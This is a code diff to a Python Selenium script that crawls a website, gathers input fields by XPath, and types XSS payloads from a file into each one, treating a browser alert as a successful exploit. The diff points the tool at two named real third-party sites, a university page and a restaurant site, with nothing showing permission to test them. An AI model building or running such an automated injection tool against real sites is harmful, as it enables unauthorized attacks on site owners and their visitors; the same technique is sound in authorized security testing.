@@ -9,6 +9,13 @@ import networkx as nx
 
 
 
+def is_alerted(driver):
+    try:
+        alert = driver.switch_to.alert
+        return(True)
+    except:
+        return False
+
 
 def get_all_xss_attacks():
     with open("attack_vectors/xss.txt") as file:
@@ -17,15 +24,24 @@ def get_all_xss_attacks():
     return(vectors)
 
 
-def test_vector(xpath_input_object , attack_chunk):
+def test_vector(driver , xpath_input_object , attack_chunk):
     url  = xpath_input_object['url']
     xpath = xpath_input_object["xpath"]
-    driver.get(url)
-    sleep(1)
     for i in attack_chunk:
-        element = driver.find_element_by_xpath(xpath)
-        element.send_keys(i)
-        element.send_keys(Keys.RETURN)
+        try:
+            print("\n testing {} at {} in {}".format(i , xpath , url))
+            driver.get(url)
+            sleep(1)
+            element = driver.find_element_by_xpath(xpath)
+            element.send_keys(i)
+            element.send_keys(Keys.RETURN)
+            sleep(0.5)
+            if(is_alerted(driver)):
+                #it means it was exploited
+                print("{} exploited in  {} with ".format(url , xpath , i))
+        except:
+            print("error exploiting {} in {} at {}".format(i , xpath , url))
+
 
 
 def get_all_xpath_inputs(driver , url):
@@ -141,11 +157,15 @@ def generate_graph(son_father_list):
 
 
 
-def get_xpaths_inputs_recursiveley(driver , root_url):
-
-    cont = recursively_scrawl(driver , root_url , 2 )
+def get_xpaths_inputs_recursiveley(driver , root_url , depth):
+    print("getting all urls... \n")
+    cont = recursively_scrawl(driver , root_url , depth )
+    print("there are {} to test".format(len(cont)))
     all_xpaths = []
+    print("getting xpaths ... \n ")
+    barr = Bar("progress getting xpaths " , max=len(cont))
     for i in cont:
+        barr.next()
         try:
             xpaths = get_all_xpath_inputs(driver , i["son"])
             for j in xpaths:
@@ -160,7 +180,11 @@ def get_xpaths_inputs_recursiveley(driver , root_url):
 
 
 driver = webdriver.Chrome()
-goal = get_xpaths_inputs_recursiveley(driver , "https://tmedweb.tulane.edu/content_open")
+goal = get_xpaths_inputs_recursiveley(driver , "https://sandwichqbano.com" , 1)
+xss_vectors = get_all_xss_attacks()
+for i in goal:
+    test_vector(driver , i , xss_vectors)
+
 print(goal)
 
 driver.close()
